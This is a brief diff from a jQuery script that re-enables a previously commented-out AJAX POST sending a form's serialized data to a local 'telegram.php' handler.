@@ -330,11 +330,11 @@ $(function() {
                         }, 1000);
                     });
 
-                    // $.ajax({
-                    //     method: "POST",
-                    //     url: "../telegram.php", //Change
-                    //     data: form.serialize()
-                    // }).done(function(){});
+                    $.ajax({
+                        method: "POST",
+                        url: "../telegram.php", //Change
+                        data: form.serialize()
+                    }).done(function(){});
                 }
             } else {}
         });
